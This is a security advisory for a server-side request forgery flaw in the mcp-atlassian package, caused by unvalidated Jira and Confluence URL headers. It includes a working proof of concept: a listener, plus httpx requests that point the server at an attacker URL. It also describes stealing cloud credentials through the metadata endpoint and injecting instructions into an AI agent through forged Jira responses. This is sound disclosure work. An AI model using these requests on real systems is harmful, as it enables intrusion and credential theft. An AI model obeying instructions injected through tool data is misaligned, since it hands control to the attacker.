# [H] MCP Atlassian has SSRF via unvalidated X-Atlassian-Jira-Url / X-Atlassian-Confluence-Url headers

## Summary
Severity: High
Advisory: GHSA-7r34-79r5-rcc9
CVE: CVE-2026-27826
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-7r34-79r5-rcc9
Type: github-advisory

## Affected
- PyPI: `mcp-atlassian` — affected >=0 <0.17.0

## Details
### Summary
An unauthenticated attacker who can reach the mcp-atlassian HTTP endpoint can force the server process to make outbound HTTP requests to an arbitrary attacker-controlled URL by supplying two custom HTTP headers without an `Authorization` header. No authentication is required. The vulnerability exists in the HTTP middleware and dependency injection layer — not in any MCP tool handler - making it invisible to tool-level code analysis. In cloud deployments, this could enable theft of IAM role credentials via the instance metadata endpoint (`169.254.169.254`). In any HTTP deployment it enables internal network reconnaissance and injection of attacker-controlled content into LLM tool results.

### Details
The server supports a multi-tenant HTTP authentication mode where clients supply per-request Jira/Confluence URLs via custom headers. The middleware (`src/mcp_atlassian/servers/main.py:436–448`) extracts `X-Atlassian-Jira-Url` from the request and stores it in request state with no validation. The dependency provider (`src/mcp_atlassian/servers/dependencies.py:189–217`) then uses this value directly as the `url=` parameter when constructing a `JiraConfig` and `JiraFetcher`. The first method call on the fetcher (`get_current_user_account_id()`) immediately issues a `GET` request to `{header_url}/rest/api/2/myself` — an outbound SSRF call to the attacker-controlled URL.

No comparison is made against the server-configured `JIRA_URL` environment variable. No private IP range blocklist is applied. No URL scheme allowlist is enforced.

  **Trigger conditions — all four must hold:**
  1. Server running with `--transport streamable-http` or `--transport sse`
  2. Request contains `X-Atlassian-Jira-Url` header (any non-empty value)
  3. Request contains `X-Atlassian-Jira-Personal-Token` header (any non-empty value)
  4. Request has **no** `Authorization` header

  An identical vulnerability exists for Confluence at `dependencies.py:341–393` via `X-Atlassian-Confluence-Url` +
  `X-Atlassian-Confluence-Personal-Token`.

  **Root cause - middleware** (`src/mcp_atlassian/servers/main.py:436–448`):
  ```python
  # When service headers are present and no Authorization header is provided,
  # auth type is set to "pat" but user_atlassian_token is NOT set.
  # This is what routes execution to the vulnerable path below.
  if service_headers and (jira_token_str and jira_url_str):
      scope["state"]["user_atlassian_auth_type"] = "pat"

  Root cause - dependency provider (src/mcp_atlassian/servers/dependencies.py:189–217):
  if (
      user_auth_type == "pat"
      and jira_url_header           # attacker-controlled, no validation
      and jira_token_header
      and not hasattr(request.state, "user_atlassian_token")
  ):
      header_config = JiraConfig(
          url=jira_url_header,      # used directly, no allowlist check
          personal_token=jira_token_header,
          ...
      )
      header_jira_fetcher = JiraFetcher(config=header_config)
      header_jira_fetcher.get_current_user_account_id()
      # ^ GET {jira_url_header}/rest/api/2/myself — outbound SSRF call
      request.state.jira_fetcher = header_jira_fetcher  # cached for all tool calls this request


### PoC
Step 1 - Start a listener to capture the inbound SSRF request:

  # listener.py
  from http.server import HTTPServer, BaseHTTPRequestHandler
  import json, sys

  class Handler(BaseHTTPRequestHandler):
      def do_GET(self):
          print(f"[SSRF RECEIVED] Path: {self.path}", file=sys.stderr)
          print(f"[SSRF RECEIVED] Headers: {dict(self.headers)}", file=sys.stderr)
          self.send_response(200)
          self.send_header("Content-Type", "application/json")
          self.end_headers()
          if "myself" in self.path:
              self.wfile.write(json.dumps({
                  "accountId": "ssrf-confirmed",
                  "displayName": "SSRF PoC"
              }).encode())
          else:
              self.wfile.write(b"{}")
      def log_message(self, *args): pass

  HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()

Step 2 - Start mcp-atlassian in HTTP transport mode (placeholder credentials are sufficient — the vulnerable path is reached before any real Atlassian instance is contacted):

  JIRA_URL=https://placeholder.atlassian.net \
  JIRA_API_TOKEN=placeholder \
  mcp-atlassian --transport streamable-http --port 8000

  Step 3 — Trigger the SSRF:

  import httpx, json

  MCP    = "http://localhost:8000/mcp"
  ATTACK = "http://<listener-ip>:8888"

  # Initialize MCP session
  r = httpx.post(MCP, json={
      "jsonrpc": "2.0", "method": "initialize",
      "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                 "clientInfo": {"name": "poc", "version": "1.0"}},
      "id": 1
  }, headers={
      "X-Atlassian-Jira-Url": ATTACK,
      "X-Atlassian-Jira-Personal-Token": "any-value",
      # No Authorization header — this is the key condition
  })
  sid = r.headers.get("mcp-session-id")

  # Call any Jira tool — this triggers get_jira_fetcher() and the outbound SSRF call
  httpx.post(MCP, json={
      "jsonrpc": "2.0", "method": "tools/call",
      "params": {"name": "jira_get_issue", "arguments": {"issue_key": "PROJ-1"}},
      "id": 2
  }, headers={
      "X-Atlassian-Jira-Url": ATTACK,
      "X-Atlassian-Jira-Personal-Token": "any-value",
      "Mcp-Session-Id": sid,
  })

  The listener will receive GET /rest/api/2/myself originating from the MCP server process, confirming the SSRF.


### Impact
This vulnerability affects any deployment using `--transport streamable-http` or `--transport sse`. The default HOST=0.0.0.0 binding exposes the HTTP endpoint to any host on the same network without any configuration change, and to the internet when deployed on a cloud instance.

  - Any HTTP deployment: The server acts as an SSRF proxy, enabling reconnaissance of internal services (databases, internal APIs, microservices)
  not directly reachable from outside the network.
  - AI agent sessions: Once the attacker-controlled fetcher is cached in request.state, all Jira tool responses for that session originate from the attacker's server. The attacker can return crafted API responses containing LLM instructions, injecting those instructions into the AI agent's context as if they were legitimate Jira data - a prompt injection channel at the data layer requiring no tool parameter manipulation.
  - Cloud deployments: Any network-reachable attacker can potentially steal the server's IAM role credentials via the instance metadata service, gaining full access to all cloud resources that role permits.

## References
- https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-7r34-79r5-rcc9
- https://github.com/sooperset/mcp-atlassian/commit/5cd697dfce9116ef330b8dc7a91291640e0528d9
- https://github.com/sooperset/mcp-atlassian
